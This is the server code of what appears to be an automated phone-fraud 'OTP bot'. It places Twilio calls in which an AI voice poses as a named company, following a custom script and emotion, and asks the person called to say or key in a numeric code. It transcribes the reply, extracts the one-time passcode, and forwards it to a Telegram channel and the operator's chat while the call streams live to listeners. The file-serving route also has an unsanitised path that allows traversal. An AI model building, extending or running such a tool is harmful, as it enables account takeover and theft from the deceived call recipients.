"""
FastAPI server handling:
- WebSocket endpoint for browser clients: `/ws/live?call_id=...`
- WebSocket endpoint for Twilio Media Streams (incoming audio): `/twilio/media` (accepts JSON events)
- HTTP endpoints for Twilio status webhook and hangup control
- Mounted Flask app for Telegram webhook and other bot routes

Run with: `uvicorn live_listen.server:app --host 0.0.0.0 --port 5001` (or any free port)
"""
import asyncio
import base64
import json
import os
import threading
import requests
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse, Response
from fastapi.middleware.wsgi import WSGIMiddleware
from typing import Optional

from config import (
    ACCOUNT_SID, AUTH_TOKEN, LIVE_LISTEN_URL, NGROK_URL, LIVE_LISTEN_SECRET,
    DEFAULT_VOICE_ID, VOICE_STABILITY, VOICE_SIMILARITY_BOOST,
    USE_AI_FLOW, VOUCH_CHANNEL_ID, SYSTEM_PROMPT
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Start
import logging

from live_listen.manager import manager

# Import AI modules (graceful degradation if missing)
try:
    from ai.session import get_session, remove_session
    from ai.llm import chat_with_ai
    from ai.tts import save_audio
    from ai.utils import extract_otp, send_otp_to_channel
    
    # ASR is optional - try to import but don't fail if unavailable
    try:
        from ai.asr import process_ulaw_buffer
    except (ImportError, Exception):
        logger_temp = logging.getLogger(__name__)
        logger_temp.warning("[STARTUP] ASR (Whisper) not available - transcription disabled")
        # Stub: return empty string if ASR unavailable
        def process_ulaw_buffer(ulaw_bytes: bytes) -> str:
            return ""
    
    AI_AVAILABLE = True
except ImportError as e:
    AI_AVAILABLE = False
    import traceback
    print(f"[STARTUP] WARNING AI modules NOT available: {e}")
    traceback.print_exc()
except Exception as e:
    AI_AVAILABLE = False
    import traceback
    print(f"[STARTUP] CRITICAL AI import error: {e}")
    traceback.print_exc()

logger = logging.getLogger(__name__)

if USE_AI_FLOW and AI_AVAILABLE:
    logger.warning("[STARTUP] OK - AI FLOW ENABLED - All AI modules available")
elif USE_AI_FLOW and not AI_AVAILABLE:
    logger.error("[STARTUP] CRITICAL: USE_AI_FLOW=true but AI modules not available!")
elif not USE_AI_FLOW:
    logger.warning("[STARTUP] AI flow disabled (USE_AI_FLOW=false)")

app = FastAPI()
twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)

# Import and mount Flask app for Telegram webhook (lazy import to avoid circular deps)
# This allows FastAPI to handle both FastAPI routes and Flask routes
def mount_flask_app():
    try:
        from bot import app as flask_app
        # Mount Flask app at root so /telegram_webhook is accessible
        app.mount("", WSGIMiddleware(flask_app))
        logger.info("✅ Flask app mounted to FastAPI - Telegram webhook accessible")
    except Exception as e:
        logger.warning(f"⚠️ Could not mount Flask app: {e} - Telegram webhook may not be accessible")

# Mount Flask app
mount_flask_app()



@app.get('/live')
async def live_ui(request: Request):
    """Serve a simple Live Listen Web App UI. Query param: call_id"""
    html_path = os.path.join(os.path.dirname(__file__), 'static', 'live.html')
    if not os.path.exists(html_path):
        return HTMLResponse('<h1>Live UI not found</h1>', status_code=404)
    return HTMLResponse(open(html_path, 'r', encoding='utf-8').read())


@app.get('/health')
async def health():
    return {'status': 'ok'}


@app.post('/conversation/start')
async def conversation_start(request: Request):
    body = {}
    try:
        body = await request.json()
    except Exception:
        try:
            form = await request.form()
            body = dict(form)
        except Exception:
            body = {}

    call_sid = body.get('call_sid') or body.get('CallSid')
    chat_id = body.get('chat_id')
    if chat_id is not None:
        try:
            chat_id = int(chat_id)
        except (ValueError, TypeError):
            chat_id = None
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')
    try:
        from live_listen.conversation import start_conversation
        asyncio.create_task(start_conversation(call_sid, chat_id))
        return {'ok': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post('/twilio/entry')
async def twilio_entry(request: Request):
    form = await request.form()
    call_sid = form.get('CallSid')
    chat_id = request.query_params.get('chat_id')
    user_id = request.query_params.get('user_id')
    custom_audio = request.query_params.get('audio')
    if call_sid:
        try:
            from live_listen.conversation import start_conversation
            asyncio.create_task(start_conversation(call_sid, chat_id, user_id, custom_audio))
        except Exception:
            pass

    media_url = LIVE_LISTEN_URL.replace('https://', 'wss://').replace('http://', 'ws://') + '/twilio/media'
    response = VoiceResponse()
    stream = Start()
    stream.stream(url=media_url)
    response.append(stream)

    gather_action = f'{LIVE_LISTEN_URL}/twilio/dtmf'
    if chat_id:
        gather_action += f'?chat_id={chat_id}'
    gather = Gather(input='speech dtmf', timeout=5, num_digits=6, action=gather_action, speech_timeout='auto', method='POST')
    gather.say('Please say or enter the numeric code when prompted.')
    response.append(gather)
    return Response(str(response), media_type='application/xml')


def notify_bot_of_digits(chat_id: str, call_sid: str, digits: str) -> None:
    if not NGROK_URL or not chat_id or not call_sid or not digits:
        return
    url = f"{NGROK_URL.rstrip('/')}/live_capture_otp"
    payload = {"chat_id": chat_id, "call_sid": call_sid, "digits": digits}
    headers = {}
    if LIVE_LISTEN_SECRET:
        headers["X-Live-Listen-Secret"] = LIVE_LISTEN_SECRET
    try:
        requests.post(url, json=payload, timeout=3, headers=headers)
    except Exception:
        pass


@app.post('/twilio/dtmf')
async def twilio_dtmf(request: Request):
    if request.headers.get('content-type', '').startswith('application/json'):
        payload = await request.json()
    else:
        form = await request.form()
        payload = dict(form)

    call_sid = payload.get('call_sid') or payload.get('CallSid')
    digits = payload.get('Digits')
    transcript = payload.get('SpeechResult') or payload.get('speech_result') or payload.get('transcript')
    chat_id = request.query_params.get('chat_id')
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')

    try:
        if digits:
            from live_listen.conversation import handle_captured_digits
            asyncio.create_task(handle_captured_digits(call_sid, digits))
            if chat_id:
                threading.Thread(target=notify_bot_of_digits, args=(chat_id, call_sid, digits), daemon=True).start()
        if transcript:
            from live_listen.conversation import handle_captured_transcript
            asyncio.create_task(handle_captured_transcript(call_sid, transcript))
    except Exception:
        pass

    return {'ok': True}


@app.websocket('/ws/live')
async def websocket_live(websocket: WebSocket, call_id: Optional[str] = None):
    """Browser Web App connects here to receive binary audio frames.

    Query params: call_id
    Sends: binary audio frames directly as bytes (clients should decode/play)
   """
    if not call_id:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    await manager.add_client(call_id, websocket)
    try:
        # Notify client of session state on connect
        s = await manager.ensure_session(call_id)
        await websocket.send_text(json.dumps({'type': 'session', 'data': s.to_dict()}))
        while True:
            # Keep connection alive; we don't expect client messages except pings
            msg = await websocket.receive_text()
            # ignore or handle simple control messages
            await websocket.send_text(json.dumps({'type': 'pong'}))
    except WebSocketDisconnect:
        await manager.remove_client(call_id, websocket)
    except Exception:
        await manager.remove_client(call_id, websocket)
        await websocket.close()


@app.websocket('/twilio/media')
async def twilio_media(ws: WebSocket):
    """Twilio Media Streams WebSocket endpoint.
    
    Handles both traditional live listen AND AI-powered call flows.
    If USE_AI_FLOW is enabled, routes to AI handler.
    Otherwise, forwards to traditional manager.
    """
    await ws.accept()
    call_id = None
    call_sid = None
    session = None
    audio_buffer = bytearray()
    BUFFER_SIZE = 8000  # ~1 second of 8kHz µ-law
    
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                continue

            event = data.get('event')
            
            # ============ START EVENT ============
            if event == 'start':
                call_sid = data.get('start', {}).get('callSid')
                call_id = call_sid
                
                # Initialize session state
                if USE_AI_FLOW:
                    if not AI_AVAILABLE:
                        logger.error(f"[WebSocket_START] CRITICAL: USE_AI_FLOW=true but AI_AVAILABLE=false. AI modules failed to import!")
                        logger.error(f"[WebSocket_START] CallSid={call_sid} will NOT use AI - falling back to traditional")
                        await manager.ensure_session(call_id, call_sid=call_sid)
                        await manager.set_state(call_id, 'in-progress')
                    else:
                        try:
                            session = get_session(call_sid)
                            logger.warning(f"[WebSocket_START] OK - AI call session started: {call_sid}")
                        except Exception as e:
                            logger.error(f"[WebSocket_START] CRITICAL: Failed to get AI session: {e}", exc_info=True)
                            await manager.ensure_session(call_id, call_sid=call_sid)
                            await manager.set_state(call_id, 'in-progress')
                else:
                    logger.info(f"[WebSocket_START] Traditional flow for {call_sid} (USE_AI_FLOW=false)")
                    await manager.ensure_session(call_id, call_sid=call_sid)
                    await manager.set_state(call_id, 'in-progress')
            
            # ============ MEDIA EVENT ============
            elif event == 'media':
                media = data.get('media', {})
                payload_b64 = media.get('payload')
                
                if payload_b64 and call_id:
                    try:
                        audio_bytes = base64.b64decode(payload_b64)
                        
                        # AI FLOW
                        if USE_AI_FLOW and AI_AVAILABLE and session:
                            # BROADCAST TO LIVE LISTEN clients first
                            await manager.broadcast_media(call_id, audio_bytes)
                            
                            audio_buffer.extend(audio_bytes)
                            
                            # Process when buffer reaches ~1 second
                            if len(audio_buffer) >= BUFFER_SIZE:
                                try:
                                    # Transcribe audio
                                    text = process_ulaw_buffer(bytes(audio_buffer))
                                    audio_buffer.clear()
                                    
                                    if text and len(text) > 1:
                                        logger.warning(f"[AI_TRANSCRIBE] OK: {text}")
                                        
                                        # Check for OTP
                                        otp = extract_otp(text, code_length=session.code_length)
                                        if otp:
                                            session.otp_captured = True
                                            session.otp_value = otp
                                            logger.warning(f"[AI_OTP_FOUND] OK: OTP={otp} (code_length={session.code_length})")
                                            
                                            try:
                                                from bot import bot
                                                send_otp_to_channel(
                                                    otp, call_sid,
                                                    session.name, session.company,
                                                    bot,
                                                    chat_id=session.chat_id
                                                )
                                                logger.warning(f"[AI_OTP_SENT] OK: Sent to channel and user chat_id={session.chat_id}")
                                            except Exception as e:
                                                logger.error(f"[AI_OTP_ERROR] CRITICAL: {e}", exc_info=True)
                                        
                                        # Generate AI response with proper system prompt and emotion
                                        system_prompt = session.custom_script or SYSTEM_PROMPT
                                        ai_response = chat_with_ai(
                                            text,
                                            session,
                                            system_prompt=system_prompt,
                                            call_type=session.call_type,
                                            emotion=session.emotion
                                        )
                                        logger.warning(f"[AI_RESPONSE] ✅ type={session.call_type}, emotion={session.emotion}: {ai_response[:80]}")
                                        
                                        # Generate and queue audio response
                                        filename = save_audio(
                                            call_sid,
                                            ai_response,
                                            voice_id=session.voice_id
                                        )
                                        # save_audio never returns None (uses fallback filenames)
                                        logger.warning(f"[AI_AUDIO_SAVED] OK: {filename}")
                                except Exception as e:
                                    logger.error(f"[AI_PROCESS_ERROR] CRITICAL: {e}", exc_info=True)
                        
                        # TRADITIONAL FLOW (fallback)
                        else:
                            if USE_AI_FLOW and not AI_AVAILABLE:
                                logger.warning(f"[FALLBACK] Using traditional flow - AI unavailable")
                            elif not USE_AI_FLOW:
                                logger.debug(f"[TRADITIONAL_FLOW] USE_AI_FLOW=false")
                            
                            await manager.broadcast_media(call_id, audio_bytes)
                            try:
                                from live_listen.conversation import handle_media_event
                                asyncio.create_task(handle_media_event(call_id, audio_bytes))
                            except Exception as e:
                                logger.debug(f"Traditional handler error: {e}")
                    
                    except Exception as e:
                        logger.error(f"Media processing error: {e}")
            
            # ============ STOP EVENT ============
            elif event == 'stop':
                logger.warning(f"[CALL_STOPPED] Call ended: {call_sid}")
                if USE_AI_FLOW and AI_AVAILABLE and session:
                    logger.warning(f"[AI_CLEANUP] Removing AI session for {call_sid}")
                    remove_session(call_sid)
                elif call_id:
                    logger.info(f"[TRADITIONAL_CLEANUP] Cleanup for {call_sid}")
                    await manager.set_state(call_id, 'completed')
                break
    
    except WebSocketDisconnect:
        logger.info(f"[WebSocket_DISCONNECT] {call_sid}")
        if USE_AI_FLOW and AI_AVAILABLE and session:
            remove_session(call_sid)
    except Exception as e:
        logger.error(f"[WebSocket_ERROR] CRITICAL in {call_sid}: {e}", exc_info=True)
        if USE_AI_FLOW and AI_AVAILABLE and session:
            remove_session(call_sid)


@app.post('/twilio/status')
async def twilio_status(request: Request):
    """Receive Twilio call status callbacks (HTTP POST). Expects form-encoded values like `CallSid` and `CallStatus`."""
    form = await request.form()
    call_sid = form.get('CallSid')
    status = form.get('CallStatus')
    if not call_sid or not status:
        return JSONResponse({'ok': False}, status_code=400)
    # Map Twilio status to manager state and broadcast
    await manager.set_state(call_sid, status)
    return {'ok': True}


@app.post('/hangup')
async def hangup(request: Request):
    """Terminate a running call by CallSid or call_id.

    JSON body: {"call_sid": "ACxxx"}
   """
    body = await request.json()
    call_sid = body.get('call_sid')
    if not call_sid:
        raise HTTPException(status_code=400, detail='call_sid required')
    try:
        twilio_client.calls(call_sid).update(status='completed')
        await manager.set_state(call_sid, 'completed')
        return {'ok': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get('/audio/{call_sid}/{filename}')
async def get_audio_file(call_sid: str, filename: str):
    """Serve generated AI audio files via HTTP.
    
    Path: /audio/{call_sid}/{filename}
    Returns: MP3 audio file or 404
    """
    filepath = f"audio/{call_sid}/{filename}"
    if os.path.exists(filepath):
        from fastapi.responses import FileResponse
        return FileResponse(filepath, media_type="audio/mpeg")
    else:
        logger.warning(f"Audio file not found: {filepath}")
        return {"error": "Not found"}, 404
